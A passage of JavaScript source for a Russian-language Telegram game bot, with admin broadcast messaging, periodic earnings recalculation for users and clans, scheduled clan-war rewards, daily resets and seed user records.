				bot.editMessageText("<b>Выполнено:</b> " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n' + str + "\n\n<b>Статистика:</b>\n<b>Успешных:</b> " + mm_ok + "\n<b>Неуспешных:</b> " + mm_err, { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm1, parse_mode: html })
			}
			if (mm_i == mm_total) {
				mm_status = false;
				bot.editMessageText("Выполнено: " + mm_i + '/' + mm_total, { chat_id: mm_achatid, message_id: mm_amsgid })
				sendAdmins('<b>Рассылка завершена!\n\nСтатистика:\nУспешно:</b> ' + mm_ok + "\n<b>Неуспешно:</b> " + mm_err, { parse_mode: html })
				mm_u = []
			}
		} finally { }
	}
}

setInterval(mmTick, 100);

var mm_total
var mm_i
var mm_status = false
var mm_amsgid
var mm_type
var mm_imgid
var mm_text
var mm_achatid
var mm_btn_status
var mm_btn_text
var mm_btn_link
var mm_ok
var mm_err

async function mm_t(text, amsgid, achatid, btn_status, btn_text, btn_link, size) {
	let ut = await User.find({}, { id: 1 }).sort({ _id: -1 })
	mm_total = ut.length
	console.log(ut)
	mm_u = []
	for (var i = 0; i < mm_total; i++)
		mm_u[i] = ut[i].id
	if (size != 100) {
		mm_u = randomizeArr(mm_u)
		mm_total = Math.ceil(mm_total * (size / 100))
		mm_u.length = mm_total
	}
	ut = undefined
	mm_i = 0;
	mm_amsgid = amsgid
	mm_type = "text"
	mm_text = text
	mm_ok = 0
	mm_err = 0
	mm_achatid = achatid
	if (btn_status) {
		mm_btn_status = true
		mm_btn_text = btn_text
		mm_btn_link = btn_link
	}
	else
		mm_btn_status = false
	mm_status = true;
}

bot.on('photo', async msg => {
	if (msg.from != undefined) {
		var uid = msg.from.id
		if (state[uid] == 7770 && ADMINS.indexOf(uid) !== -1) {
			state[uid] = undefined
			var text = ""
			if (msg.caption != undefined) text = msg.caption
			bot.sendMessage(uid, "Рассылка запущена!").then((e) => {
				if (text.split("#").length == 4) {
					var btn_text = text.split("#")[1].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
					var btn_link = text.split("#")[2].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
					text = text.split("#")[0].replace(/(^\s*)|(\s*)$/g, '').replace(' ', '')
					mm_img(msg.photo[msg.photo.length - 1].file_id, text, e.message_id, e.chat.id, true, btn_text, btn_link, 100)

				}
				else
					mm_img(msg.photo[msg.photo.length - 1].file_id, text, e.message_id, e.chat.id, false, false, false, 100)

			})
		}
	}
})



async function mm_img(img, text, amsgid, achatid, btn_status, btn_text, btn_link, size) {
	let ut = await User.find({}, { id: 1 }).sort({ _id: -1 })
	mm_total = ut.length
	mm_u = []
	for (var i = 0; i < mm_total; i++)
		mm_u[i] = ut[i].id
	if (size != 100) {
		mm_u = randomizeArr(mm_u)
		mm_total = Math.ceil(mm_total * (size / 100))
		mm_u.length = mm_total
	}

	ut = undefined
	mm_i = 0;
	mm_amsgid = amsgid
	mm_type = "img"
	mm_text = text
	mm_imgid = img
	mm_ok = 0
	mm_err = 0
	mm_achatid = achatid
	if (btn_status) {
		mm_btn_status = true
		mm_btn_text = btn_text
		mm_btn_link = btn_link
	}
	else
		mm_btn_status = false
	mm_status = true;
}

function randomizeArr(arr) {
	var j, temp;
	for (var i = arr.length - 1; i > 0; i--) {
		j = Math.floor(Math.random() * (i + 1));
		temp = arr[j];
		arr[j] = arr[i];
		arr[i] = temp;
	}
	return arr;
}

const html = "HTML"

function sendAdmins(text, params) { for (var i = 0; i < ADMINS.length; i++) bot.sendMessage(ADMINS[i], text, params) }

var data = []


function roundPlus(number) { if (isNaN(number)) return false; var m = Math.pow(10, 2); return Math.round(number * m) / m; }

async function main() {
	var u = (await User.find({}, { id: 1 })).map((e) => { return e.id })
	for (var i in u) {
		await User.findOneAndUpdate({ id: u[i] }, { refCount: await User.countDocuments({ ref: u[i] }) })
		console.log(i)
	}

}
//main()

//User.updateMany({}, {payout: 0, not: false}).then()

async function totalEarnCalc() {
	var users = await User.find()
	for (const i in users) {
		try {
			var user = users[i]
			let total_earn = 0;
			user.trees.map((x) => {
				total_earn += trees.find((a) => a.id == x.id).earn
			})
			await User.findOneAndUpdate({ id: user.id }, { totalEarn: total_earn })
			console.log(i + "/" + users.length + " - " + total_earn)
		}
		catch { }
	}
}
setInterval(totalEarnCalc, 1000 * 60 * 15)

async function totalClanEarnCalc() {
	var clans = await Clan.find()
	for (const i in clans) {
		try {
			var clan = clans[i]
			let total_earn = 0;
			var users = await User.find({ clanName: clan.name })
			users.map(u => { total_earn += u.totalEarn })
			await Clan.findOneAndUpdate({ name: clan.name }, { total_earn: total_earn })
			console.log(i + "/" + clans.length + " - " + total_earn)
		}
		catch { }
	}
}

setInterval(totalClanEarnCalc, 1000 * 60 * 15)

async function clanWar() {
	var d = new Date()
	var minutes = d.getMinutes()
	var hours = d.getHours()
	var date = d.getDate()
	if (!(minutes == 0 && hours == 0 && (date == 5 || date == 15 || date == 25))) return
	var d = new Date()
	var clans = await Clan.find({ $and: [{ name: { $ne: "." } }, { name: { $ne: "dsfsdf" } }] }).sort({ total_earn: -1 }).limit(5)
	await Clan.findOneAndUpdate({ name: clans[0].name }, { $inc: { balance: 5000 } })
	await Clan.findOneAndUpdate({ name: clans[1].name }, { $inc: { balance: 3000 } })
	await Clan.findOneAndUpdate({ name: clans[2].name }, { $inc: { balance: 2500 } })
	await Clan.findOneAndUpdate({ name: clans[3].name }, { $inc: { balance: 1500 } })
	await Clan.findOneAndUpdate({ name: clans[4].name }, { $inc: { balance: 1000 } })
	var us = await User.find({ clanName: { $exists: true } }, { id: 1 })
	var nwd = new Date(getNextClanWarTimestamp())
	for (const i in us) {
		try {
			await bot.sendMessage(us[i].id, `
<b>⚡️ ${d.getDate()}.${d.getMonth() + 1}.${d.getFullYear()} была проведена битва Домов!</b>\n
🏆 Победил Дом  <b>${clans[0].name}</b>
💰 Он получает <b>⚡️ 5k Энергии</b> в казну Клана\n
2 место - <b>${clans[1].name}</b> - получает <b>⚡️ 3k Энергии</b>
3 место - <b>${clans[2].name}</b> - получает <b>⚡️ 2.5k Энергии</b>
4 место - <b>${clans[3].name}</b> - получает <b>⚡️️ 1.5k Энергии</b>
5 место - <b>${clans[4].name}</b> - получает <b>⚡️ 1k Энергии</b>\n
⚡️ Следующий бой <b>${nwd.getDate()}.${nwd.getMonth() + 1}.${nwd.getFullYear()}</b>
			`, { parse_mode: "html" });
		}
		catch{ }
	}
}

async function ticker() {
	var d = new Date()
	var minutes = d.getMinutes()
	var hours = d.getHours()
	var date = d.getDate()
	if (minutes == 0 && hours == 0 && (date == 5 || date == 15 || date == 25))
		clanWar()
	if (minutes == 0 && hours == 0)
		await User.updateMany({}, { game_limit: 10, spinsToday: 0 })
}

setInterval(ticker, 1000 * 60)

function getNextClanWarTimestamp() {
	var dt = new Date()
	var m = dt.getMonth()
	var d = dt.getDate()
	if (d < 5) dt.setDate(5)
	else if (d >= 25) {
		dt.setDate(5)
		dt.setMonth(dt.getMonth() + 1)
	}
	else if (d >= 5 && d < 15) dt.setDate(15)
	else if (d >= 15 && d < 25) dt.setDate(25)
	return dt.getTime()
}

/*Clan.findOneAndUpdate({ name: "👑MARVEL👑" }, { creator_id: 816070668 }).then()

async function giveTree(uid, id) {
	var u = await User.findOne({ id: uid });
	let total_balance = 0;
	u.trees.map((x) => { total_balance += (((Date.now() - u.lastCollect) / 1000) / 60) * (trees.find((a) => a.id == x.id).earn / 60); })
	u.trees.push({ id: id, date: Date.now(), lastCollect: Date.now() });
	await User.findOneAndUpdate({ id: uid }, { lastCollect: Date.now(), fetuses: Number(total_balance.toFixed(2)), trees: u.trees })
}



function randomizeArr(arr) {
	var j, temp;
	for (var i = arr.length - 1; i > 0; i--) {
		j = Math.floor(Math.random() * (i + 1));
		temp = arr[j];
		arr[j] = arr[i];
		arr[i] = temp;
	}
	return arr;
}


WildBee.insertMany([{ creator_id: 292966454, start_time: Date.now(), level: 1, bee_profit: 0 }]).then()
*/
function randomInteger(min, max) {
	// случайное число от min до (max+1)
	let rand = min + Math.random() * (max + 1 - min);
	return Math.floor(rand);
}
User.insertMany([
{ "_id" : "5dfaac928d3ea75ef63263ba", "id" : 0, "outbalance": 0,  "wb_profits" : 0, "name" : "Adi company ©", "fc" : 0, "ref" : 0., "regDate" : "18/12/2019", "deposit" : 0, "payout" : 0, "fetuses" : 0, "menu" : "{\"price\":20,\"status\":false,\"count\":5,\"bought\":3}", "lastCollect" : 1576709266975, "ban" : false, "refCount" : 0, "ref2Count" : 0, "ref3Count" : 0, "ref4Count" : 0, "ref5Count" : 0, "ref6Count" : 0, "ref7Count" : 0, "ref8Count" : 0, "ref9Count" : 0, "ref10Count" : 0, "not" : false, "__v" : 0, "totalEarn" : 0, "prudLevel" : 0 },
{ "_id" : "5dfbe31493b06e7818e2c5d7", "id" : 1, "menu" : "{\"price\":20,\"status\":true,\"count\":5,\"bought\":3}", "__v" : 0, "totalEarn" : 0, "prudLevel" : 0 }
]).then()
